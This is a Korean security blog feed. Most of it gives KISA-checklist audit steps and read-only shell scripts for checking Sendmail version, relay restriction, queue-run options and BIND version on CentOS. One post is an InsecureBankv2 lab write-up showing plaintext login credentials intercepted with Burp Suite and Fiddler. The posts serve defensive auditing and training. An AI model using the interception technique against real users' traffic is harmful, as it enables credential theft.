<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[안드로이드 취약점] 안전하지 않은 HTTP 통신</title>
    <url>/2022/01/12/2022-01-12-%5B%EC%95%88%EB%93%9C%EB%A1%9C%EC%9D%B4%EB%93%9C%20%EC%B7%A8%EC%95%BD%EC%A0%90%5D%20%EC%95%88%EC%A0%84%ED%95%98%EC%A7%80%20%EC%95%8A%EC%9D%80%20HTTP%20%ED%86%B5%EC%8B%A0/</url>
    <content><![CDATA[<h1 id="🤔-안전하지-않은-HTTP-통신"><a href="#🤔-안전하지-않은-HTTP-통신" class="headerlink" title="🤔  안전하지 않은 HTTP 통신?"></a>🤔  안전하지 않은 HTTP 통신?</h1><br>

<p>애플리케이션과 서버 간 데이터 통신을 할 때 HTTP를 사용하여 발생하는 취약점입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔎-취약점-진단"><a href="#🔎-취약점-진단" class="headerlink" title="🔎 취약점 진단"></a>🔎 취약점 진단</h1><br>

<blockquote>
<p>본 취약점 점검 앱은 <code>Insecurebankv2</code>로 진행합니다.</p>
</blockquote>
<br>

<br>

<p>HTTP를 사용하여 통신을 하면 그 과정에서 정보 전송 시 평문이 노출됩니다.</p>
<p>공격자가 스니핑, 스푸핑 공격을 이용하여 사용자들의 입력값을 패킷을 통해서 탈취할 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="💡-점검-방법"><a href="#💡-점검-방법" class="headerlink" title="💡 점검 방법"></a>💡 점검 방법</h1><br>

<h2 id="가상-디바이스-프록시-설정"><a href="#가상-디바이스-프록시-설정" class="headerlink" title="가상 디바이스 프록시 설정"></a>가상 디바이스 프록시 설정</h2><br>

<p>연결되어 있는 네트워크를 선택하여 <code>proxy</code> 설정을 해주었습니다.</p>
<br>

<img src="/images/Android/안전하지 않은 HTTP 통신/proxy.png">

<br>

<br>

<h2 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h2><br>

<p>인시큐어뱅크 애플리케이션에서 로그인을하니 <code>Burp Suite</code>에 평문으로 아이디와 비밀번호가 노출되었습니다.</p>
<br>

<img src="/images/Android/안전하지 않은 HTTP 통신/burp.png">

<br>

<br>

<h2 id="Fiddler"><a href="#Fiddler" class="headerlink" title="Fiddler"></a>Fiddler</h2><br>

<p><code>Fiddler</code>로 패킷 캡쳐했습니다.</p>
<br>

<img src="/images/Android/안전하지 않은 HTTP 통신/fiddler.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-대응-방안"><a href="#🔒-대응-방안" class="headerlink" title="🔒 대응 방안"></a>🔒 대응 방안</h1><br>

<p><code>SSL / TLS</code> 암호화를 적용해야 합니다.</p>
<p>민감한 데이터를 전송할 때 최소한 128비트 이상의 키를 사용해야하고, 안전한 암호 알고리즘을 사용해야합니다.</p>
<br>

<br>

<hr>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>모바일</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-30 Sendmail 버전 점검</title>
    <url>/2022/01/13/2022-01-13-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-30%20Sendmail%20%EB%B2%84%EC%A0%84%20%EC%A0%90%EA%B2%80/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>취약한 버전의 <code>Sendmail</code> 서비스 이용 여부 점검입니다.</p>
<p>항목코드는 <code>U-30</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<h2 id="Sendmail"><a href="#Sendmail" class="headerlink" title="Sendmail?"></a>Sendmail?</h2><br>

<p>인터넷을 통해 이메일을 전송하는데 사용되는 SMTP를 포함하여 수많은 종류의 메일 전송 및 전달 방식을 지원하는 범용 목적 인터네트워크 이메일 라우팅 기능입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p><code>Sendmail</code> 서비스 사용 목적 검토 및 취약점이 없는 버전의 사용 유무 점검으로 최적화된 <code>Sendmail</code> 서비스의 운영하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>취약점이 발견된 <code>Sendmail</code> 버전의 경우 버퍼 오버플로우 공격에 의한 시스템 권한 획득 및 주요 정보 요출 가능성이 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.100</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : <code>Sendmail</code> 버전이 최신버전인 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : <code>Sendmail</code> 버전이 최신버전이 아닌 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>1) <code>Sendmail</code> 서비스 실행 여부 점검<br />    <code># ps -ef | grep sendmail</code><br /><br />2) <code>Sendmail</code> 버전 점검<br />    <code># telnet localhost 25</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># ps -ef | grep sendmail | grep -v &quot;grep&quot;</p>
</blockquote>
<br>

<p><code>Sendmail</code>이 프로세스가 활성화되어 있는지 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-30/ps.png">

<br>

<br>

<blockquote>
<p># sendmail -d0.1 &lt; /dev/null | grep -i Version</p>
</blockquote>
<br>

<p><code>Sendmail</code>의 버전정보를 확인해주었습니다.</p>
<p><code>주요정보통신기발시설 취약점 진단 가이드</code> 에서는 <code>telnet localhost 25</code> 명령어로 점검하는것으로 나와있는데 <code>telnet</code> 서비스를 사용안하는 경우도 있을 수 있기 때문에 다른 방법으로 점검하였습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-30/version.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<p><code>Sendmail</code> 서비스 실행 여부 및 버전 점검 후 <code>http://www.sendmail.org/</code> 또는 각 OS 벤더사의 보안 패치를 설치합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`ps -ef | grep sendmail | grep -v <span class="string">&quot;grep&quot;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=O</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=X</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">Version=`sendmail -d0.1 &lt; /dev/null | grep -i Version`</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-30 [Sendmail 버전 점검]<span class="string">&quot;\n&quot;</span>Sendmail 서비스 활성화 여부 : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span><span class="string">&quot;\n&quot;</span>Sendmail 버전 : <span class="string">&quot;<span class="variable">$Version</span>&quot;</span> | tee /root/result/u-30.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>Sendmail</code> 프로세스가 활성화되어 있는지 확인하고 <code>Version</code> 정보를 출력해줍니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-30</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-30/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-31 스팸 메일 릴레이 제한</title>
    <url>/2022/01/14/2022-01-14-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-31%20%EC%8A%A4%ED%8C%B8%20%EB%A9%94%EC%9D%BC%20%EB%A6%B4%EB%A0%88%EC%9D%B4%20%EC%A0%9C%ED%95%9C/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p><code>SMTP</code> 서버의 릴레이 기능 제한 여부 점검입니다.</p>
<p>항목코드는 <code>U-31</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<h2 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP?"></a>SMTP?</h2><br>

<p>Simple Mail Transfer Protocol의 약자로 간이 전자 우편 전송 프로토콜입니다.</p>
<p>인터넷에서 이메일을 보내기 위해 이용되는 프로그램입니다. TCP <code>25번</code> 포트를 사용합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>스팸 메일 서버로의 악용방지 및 서버 과부하의 방지를 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p><code>SMTP</code> 서버의 릴레이 기능을 제한하지 않는 경우 악의적인 사용목적을 가진 사용자들이 스팸메일 서버로 사용하거나 Dos 공격의 대상이 될 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.100</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : <code>SMTP</code> 서비스를 사용하지 않거나 릴레이 제한이 설정되어 있는 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : <code>SMTP</code> 서비스를 사용하며 릴레이 제한이 설정되어 있지 않은 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td><code>SMTP</code> 서비스 사용 여부 및 릴레이 제한 옵션 확인<br />    <code># ps -ef | grep sendmail | grep -v &quot;grep&quot;</code><br />    <code># cat /etc/mail/sendmail.cf | grep &quot;R$\*&quot; | grep &quot;Relaying denied&quot;</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># ps -ef | grep sendmail | grep -v &quot;grep&quot;</p>
</blockquote>
<br>

<p><code>Sendmail</code>이 프로세스가 활성화되어 있는지 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-30/ps.png">

<br>

<br>

<blockquote>
<p># cat /etc/mail/sendmail.cf | grep &quot;R$*&quot; | grep &quot;Relaying denied&quot;</p>
</blockquote>
<br>

<p>릴레이 제한이 설정되어있는지 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-31/cat.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>1) vi 편집기를 이용하여 <code>sendmail.cf</code> 설정파일 열기<br />    설정파일은 <code>/etc/mail/sendmail.cf</code> 위치에 있음<br /><br />2) 아래와 같이 주석 제거<br />    (수정 전) <code>#R$* $#error $@ 5.7.1 $: &quot;550 Relaying denied&quot;</code><br />    (수정 후) <code>R$* $#error $@ 5.7.1 $: &quot;550 Relaying denied&quot;</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line">cf=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`ps -ef | grep sendmail | grep -v <span class="string">&quot;grep&quot;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=O</span><br><span class="line">        process=`cat /etc/mail/sendmail.cf | grep <span class="string">&quot;R$\*&quot;</span> | grep <span class="string">&quot;Relaying denied&quot;</span>`</span><br><span class="line">        <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> == *<span class="string">&quot;#R$&quot;</span>* ]]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                cf=취약</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                cf=양호</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=X</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-31 [스팸 메일 릴레이 제한]<span class="string">&quot;\n&quot;</span>Sendmail 서비스 활성화 여부 : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span><span class="string">&quot;\n&quot;</span>릴&gt;레이 제한 설정  : <span class="string">&quot;<span class="variable">$cf</span>&quot;</span> | tee /root/result/u-31.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>Sendmail</code> 프로세스가 활성화되어 있는지 확인하고 릴레이 제한이 설정되어 있는지 확인해줍니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-31</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-31/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-32 일반사용자의 Sendmail 실행 방지</title>
    <url>/2022/01/16/2022-01-16-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-32%20%EC%9D%BC%EB%B0%98%EC%82%AC%EC%9A%A9%EC%9E%90%EC%9D%98%20Sendmail%20%EC%8B%A4%ED%96%89%20%EB%B0%A9%EC%A7%80/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p><code>SMTP</code> 서비스 사용 시 일반사용자의 <code>q</code> 옵션 제한 여부 점검입니다.</p>
<p>항목코드는 <code>U-32</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<h2 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP?"></a>SMTP?</h2><br>

<p>Simple Mail Transfer Protocol의 약자로 간이 전자 우편 전송 프로토콜입니다.</p>
<p>인터넷에서 이메일을 보내기 위해 이용되는 프로그램입니다. TCP <code>25번</code> 포트를 사용합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>일반사용자의 <code>q</code> 옵션을 제한하여 <code>Sendmail</code> 설정 및 메일큐를 강제적으로 drop 시킬 수 없게 하여 비인가자에 의한 <code>SMTP</code> 서비스 오류 방지하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>일반 사용자가 <code>q</code> 옵션을 이용해서 메일큐, <code>Sendmail</code> 설정을 보거나 메일큐를 강제적으로 drop 시킬 수 있어 악의적으로 <code>SMTP</code> 서버의 오류를 발생 시킬 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : <code>SMTP</code> 서비스 미사용 또는 일반 사용자의 <code>Sendmail</code> 실행 방지가 설정된 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : <code>SMTP</code> 서비스 사용 및 일반 사용자의 <code>Sendmail</code> 실행 방지가 설정되어 있지 않은 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td><code>SMTP</code> 서비스 사용 여부 및 <code>restrictqrun</code> 옵션 확인<br />    <code># ps -ef | grep sendmail | grep -v &quot;grep&quot;</code><br />    <code># grep -v &#39;^ *#&#39; /etc/mail/sendmail.cf | grep PrivacyOptions</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># ps -ef | grep sendmail | grep -v &quot;grep&quot;</p>
</blockquote>
<br>

<p><code>Sendmail</code>이 프로세스가 활성화되어 있는지 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-30/ps.png">

<br>

<br>

<blockquote>
<p># grep -v &#39;^ *#&#39; /etc/mail/sendmail.cf | grep PrivacyOptions</p>
</blockquote>
<br>

<p><code>restrictqrun</code> 옵션이 있는지 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-32/grep.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>1) vi 편집기를 이용하여 <code>sendmail.cf</code> 설정파일 열기<br />    설정파일은 <code>/etc/mail/sendmail.cf</code> 위치에 있음<br /><br />2) <code>O PrivacyOptions=</code> 설정 부분에 <code>restrictqrun</code> 옵션 추가<br />    (수정 전) <code>O PrivacyOptions=authwarnings,novrfy,noexpn</code><br />    (수정 후) <code>O PrivacyOptions=authwarnings,novrfy,noexpn,restrictqrun</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line">cf=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`ps -ef | grep sendmail | grep -v <span class="string">&quot;grep&quot;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=O</span><br><span class="line">        process=`grep -v <span class="string">&#x27;^ *#&#x27;</span> /etc/mail/sendmail.cf | grep PrivacyOptions`</span><br><span class="line">        <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> == *<span class="string">&quot;restrictqrun&quot;</span>* ]]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                cf=양호</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                cf=취약</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=X</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-32 [일반사용자의 Sendmail 실행 방지]<span class="string">&quot;\n&quot;</span>Sendmail 서비스 활성화 여부 : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span><span class="string">&quot;\n&quot;</span>restrictqrun 옵션 여부 : <span class="string">&quot;<span class="variable">$cf</span>&quot;</span> | tee /root/result/u-32.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>Sendmail</code> 프로세스가 활성화되어 있는지 확인하고 <code>restrictqrun</code> 옵션이 설정되어 있는지 확인해줍니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-32</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-32/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-33 DNS 보안 버전 패치</title>
    <url>/2022/01/16/2022-01-16-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-33%20DNS%20%EB%B3%B4%EC%95%88%20%EB%B2%84%EC%A0%84%20%ED%8C%A8%EC%B9%98/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p><code>BIND</code> 최신버전 사용 유무 및 주기적 보안 패치 여부 점검입니다.</p>
<p>항목코드는 <code>U-33</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<h2 id="BIND"><a href="#BIND" class="headerlink" title="BIND?"></a>BIND?</h2><br>

<p>BSD 기반의 유닉스 시스템을 위해 설계된 <code>DNS</code>로 서버와 resolver 라이브러리로 구성되어 있습니다.</p>
<p>네임서버는 클라이언트들이 이름 자원들이나 객체들에 접근하여 네트워크 내외 다른 객체들과 함께 정보를 공유할 수 있게 해주는 네트워크 서비스로 사실상 컴퓨터 네트워크 내의 객체들을 위한 분산 데이터베이스 시스템입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>취약점이 발표되지 않은 <code>BIND</code> 버전의 사용을 목적으로 합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>최신버전 이하의 버전에서는 서비스거부 공격, 버퍼 오버플로우 및 DNS 서버 원격 침입 등의 취약성이 존재합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : <code>DNS</code> 서비스를 사용하지 않거나 주기적으로 패치를 관리하고 있는 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : <code>DNS</code> 서비스를 사용하며 주기적으로 패치를 관리하고 있지 않는 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td><code>DNS</code> 서비스 사용 및 <code>BIND</code> 버전 확인<br />    <code># ps -ef | grep named</code><br />    <code># named -v</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># named -v</p>
</blockquote>
<br>

<p><code>BIND</code>의 버전을 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-33/version.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>1) <code>BIND</code>는 거의 모든 버전이 취약한 상태로서 최신 버전으로 업데이트가 요구됨<br /><br />2) 다음은 구체적인 <code>BIND</code> 취약점들이며 취약점 관련 버전을 사용하는 시스템에서는 버전 업그레이드를 하여야 합니다.</td>
